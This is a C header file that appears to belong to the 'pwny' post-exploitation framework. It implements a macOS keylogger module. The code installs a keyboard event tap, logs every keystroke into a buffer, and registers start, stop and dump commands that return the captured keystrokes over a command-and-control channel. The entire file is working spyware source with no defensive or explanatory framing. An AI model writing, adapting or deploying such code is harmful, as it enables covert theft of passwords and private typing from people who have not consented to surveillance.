/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _KEYSCAN_H_
#define _KEYSCAN_H_

#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include <CoreGraphics/CoreGraphics.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Carbon/Carbon.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define KEYSCAN_BASE 11

#define KEYSCAN_START \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       KEYSCAN_BASE, \
                       API_CALL)
#define KEYSCAN_STOP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       KEYSCAN_BASE, \
                       API_CALL + 1)
#define KEYSCAN_DUMP \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       KEYSCAN_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_KEYSCAN_DATA TLV_TYPE_CUSTOM(TLV_TYPE_STRING, KEYSCAN_BASE, API_TYPE)

#define KEYSCAN_BUF_SIZE 65536

static char keyscan_buffer[KEYSCAN_BUF_SIZE];
static volatile int keyscan_offset = 0;
static pthread_mutex_t keyscan_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_t keyscan_thread;
static CFMachPortRef keyscan_port = NULL;
static CFRunLoopRef keyscan_runloop = NULL;
static volatile int keyscan_running = 0;

static void keyscan_append(const char *text)
{
    size_t len = strlen(text);

    pthread_mutex_lock(&keyscan_mutex);

    if (keyscan_offset + len < KEYSCAN_BUF_SIZE - 1)
    {
        memcpy(keyscan_buffer + keyscan_offset, text, len);
        keyscan_offset += len;
        keyscan_buffer[keyscan_offset] = '\0';
    }

    pthread_mutex_unlock(&keyscan_mutex);
}

static CGEventRef keyscan_callback(CGEventTapProxy proxy, CGEventType type,
                                   CGEventRef event, void *refcon)
{
    (void)proxy;
    (void)refcon;

    if (type == kCGEventKeyDown)
    {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

        /* Handle special keys */
        switch (keycode)
        {
            case kVK_Return:      keyscan_append("<CR>"); return event;
            case kVK_Tab:         keyscan_append("<Tab>"); return event;
            case kVK_Delete:      keyscan_append("<BS>"); return event;
            case kVK_ForwardDelete: keyscan_append("<Del>"); return event;
            case kVK_Escape:      keyscan_append("<Esc>"); return event;
            case kVK_LeftArrow:   keyscan_append("<Left>"); return event;
            case kVK_RightArrow:  keyscan_append("<Right>"); return event;
            case kVK_UpArrow:     keyscan_append("<Up>"); return event;
            case kVK_DownArrow:   keyscan_append("<Down>"); return event;
            case kVK_Home:        keyscan_append("<Home>"); return event;
            case kVK_End:         keyscan_append("<End>"); return event;
            case kVK_PageUp:      keyscan_append("<PgUp>"); return event;
            case kVK_PageDown:    keyscan_append("<PgDn>"); return event;
            case kVK_F1:  case kVK_F2:  case kVK_F3:  case kVK_F4:
            case kVK_F5:  case kVK_F6:  case kVK_F7:  case kVK_F8:
            case kVK_F9:  case kVK_F10: case kVK_F11: case kVK_F12:
            {
                char fkey[8];
                int fnum = 0;
                switch (keycode)
                {
                    case kVK_F1: fnum=1; break; case kVK_F2: fnum=2; break;
                    case kVK_F3: fnum=3; break; case kVK_F4: fnum=4; break;
                    case kVK_F5: fnum=5; break; case kVK_F6: fnum=6; break;
                    case kVK_F7: fnum=7; break; case kVK_F8: fnum=8; break;
                    case kVK_F9: fnum=9; break; case kVK_F10: fnum=10; break;
                    case kVK_F11: fnum=11; break; case kVK_F12: fnum=12; break;
                }
                snprintf(fkey, sizeof(fkey), "<F%d>", fnum);
                keyscan_append(fkey);
                return event;
            }
        }

        /* Convert to Unicode string */
        UniCharCount length = 0;
        UniChar chars[4];

        CGEventKeyboardGetUnicodeString(event, 4, &length, chars);
        if (length > 0)
        {
            char utf8[16];
            CFStringRef str = CFStringCreateWithCharacters(kCFAllocatorDefault, chars, length);
            if (str)
            {
                if (CFStringGetCString(str, utf8, sizeof(utf8), kCFStringEncodingUTF8))
                {
                    keyscan_append(utf8);
                }
                CFRelease(str);
            }
        }
    }
    else if (type == kCGEventTapDisabledByTimeout ||
             type == kCGEventTapDisabledByUserInput)
    {
        /* Re-enable the tap */
        if (keyscan_port)
        {
            CGEventTapEnable(keyscan_port, true);
        }
    }

    return event;
}

static void *keyscan_thread_proc(void *arg)
{
    CFRunLoopSourceRef source;

    (void)arg;

    keyscan_port = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionListenOnly,
        CGEventMaskBit(kCGEventKeyDown),
        keyscan_callback,
        NULL
    );

    if (keyscan_port == NULL)
    {
        log_debug("* CGEventTapCreate failed (need Accessibility permissions)\n");
        keyscan_running = 0;
        return NULL;
    }

    source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, keyscan_port, 0);
    keyscan_runloop = CFRunLoopGetCurrent();
    CFRunLoopAddSource(keyscan_runloop, source, kCFRunLoopCommonModes);
    CGEventTapEnable(keyscan_port, true);

    keyscan_running = 1;

    CFRunLoopRun();

    CFRelease(source);
    CFRelease(keyscan_port);
    keyscan_port = NULL;
    keyscan_runloop = NULL;

    return NULL;
}

static tlv_pkt_t *keyscan_start(c2_t *c2)
{
    if (keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    keyscan_offset = 0;
    memset(keyscan_buffer, 0, KEYSCAN_BUF_SIZE);

    if (pthread_create(&keyscan_thread, NULL, keyscan_thread_proc, NULL) != 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Wait for thread to initialize */
    usleep(200000);

    if (!keyscan_running)
    {
        pthread_join(keyscan_thread, NULL);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *keyscan_stop(c2_t *c2)
{
    if (!keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    }

    keyscan_running = 0;

    if (keyscan_runloop)
    {
        CFRunLoopStop(keyscan_runloop);
    }

    pthread_join(keyscan_thread, NULL);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *keyscan_dump(c2_t *c2)
{
    tlv_pkt_t *result;

    if (!keyscan_running)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pthread_mutex_lock(&keyscan_mutex);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_KEYSCAN_DATA, keyscan_buffer);

    keyscan_offset = 0;
    memset(keyscan_buffer, 0, KEYSCAN_BUF_SIZE);

    pthread_mutex_unlock(&keyscan_mutex);

    return result;
}

void register_keyscan_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, KEYSCAN_START, keyscan_start);
    api_call_register(api_calls, KEYSCAN_STOP, keyscan_stop);
    api_call_register(api_calls, KEYSCAN_DUMP, keyscan_dump);
}

#endif
